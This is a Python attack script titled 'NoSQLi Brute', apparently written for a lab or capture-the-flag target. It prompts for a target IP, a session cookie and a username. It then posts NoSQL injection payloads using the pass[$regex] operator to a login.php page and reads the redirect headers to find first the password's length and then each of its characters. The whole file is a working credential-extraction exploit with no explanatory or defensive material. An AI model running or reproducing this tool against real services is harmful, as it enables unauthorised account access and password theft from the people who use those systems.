import requests
import string

print('''

_   __     _____ ____    __    _       ____             __     
   / | / /___ / ___// __ \  / /   (_)     / __ )_______  __/ /____ 
  /  |/ / __ \\__ \/ / / / / /   / /_____/ __  / ___/ / / / __/ _ \ 
 / /|  / /_/ /__/ / /_/ / / /___/ /_____/ /_/ / /  / /_/ / /_/  __/
/_/ |_/\____/____/\___\_\/_____/_/     /_____/_/   \__,_/\__/\___/                                                                  

''')

print("*** NoSQLi Brute *** " + "\n")
ip = input("Enter Target IP: ")
session_id = input("Enter Session ID: ")
user = input("Enter name of user: ")
print(f"\nAddress => {ip}")
print(f"Session_id => {session_id}")
print(f"User => {user}" + "\n")

url = f"http://{ip}/login.php"

headers = {
    'Host': ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': f'http://{ip}',
    'Connection': 'keep-alive',
    'Referer': f'http://{ip}/',
    'Cookie': f'PHPSESSID={session_id}',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=0, i'
}

def len_of_pass(username):
    """Identify length of user password """

    for i in range(100):
       value = i

       # regex payload to brute force pass len
       payload = f"user={username}&pass[$regex]=^.{{{value}}}$&remember=on"
       response = requests.post(url, headers=headers, data=payload, allow_redirects=False)

       # Identify anomalies in response headers
       if 'Location' in response.headers and response.headers['Location'] != "/?err=1":
           print(f"Password length is {value}!")
           length = value
           return length
       else:
           pass

def find_pass(length, username):
    """ Identify password """

    print( "\n" + "Loading...." + "\n")
    password = ""

    for pos in range(1, length + 1):

        # Combining ascii letters, digits, and punctuation
        charset = string.ascii_letters + string.digits + string.punctuation
        for char in charset:

            current_pass = password + char + "." * (length - len(password) - 1)

            payload = f"user={username}&pass[$regex]=^{current_pass}$&remember=on"
            response = requests.post(url, headers=headers, data=payload, allow_redirects=False)

            if 'Location' in response.headers and response.headers['Location'] != "/?err=1":
                password += char
                break
            else:
                pass

    print("=================================")
    print(f"Password discovered: {password}!")
    print("=================================")


password_length = len_of_pass(user)
if password_length:
    find_pass(password_length, user)



